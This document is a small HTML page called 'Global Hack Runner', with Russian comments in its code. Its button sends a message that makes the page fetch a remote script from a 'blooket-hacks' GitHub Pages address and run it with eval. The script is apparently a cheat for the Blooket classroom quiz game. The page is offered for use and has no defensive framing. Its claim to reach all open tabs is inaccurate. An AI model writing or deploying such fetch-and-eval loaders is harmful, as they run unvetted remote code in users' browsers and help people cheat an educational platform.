<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Hack Runner</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            background-color: #282c34;
            color: white;
            margin-top: 50px;
        }
        h1 {
            font-size: 28px;
        }
        button {
            background-color: #28a745;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            border: none;
            cursor: pointer;
            border-radius: 8px;
            margin-top: 20px;
        }
        button:hover {
            background-color: #218838;
        }
        .container {
            background: #1e1e1e;
            padding: 20px;
            border-radius: 10px;
            display: inline-block;
            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.2);
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>🚀 Global Hack Runner</h1>
        <p>Click the button below to run the hack in all open tabs.</p>
        <button onclick="runHack()">🚀 Run Hack in All Tabs</button>
    </div>

    <script>
        function runHack() {
            // Отправляем сообщение ВСЕМ вкладкам
            const message = { command: "RUN_HACK" };
            window.postMessage(message, "*");
            alert("✅ Hack command sent to all tabs!");
        }

        function executeHack() {
            // Загружаем и выполняем hack.js
            fetch('https://vasiliy809.github.io/blooket-hacks/hack.js')
                .then(response => response.text())
                .then(eval)
                .catch(error => console.error('❌ Hack failed:', error));
        }

        // Ждём сообщения от других вкладок
        window.addEventListener("message", (event) => {
            if (event.data.command === "RUN_HACK") {
                executeHack();
            }
        });

    </script>

</body>
</html>
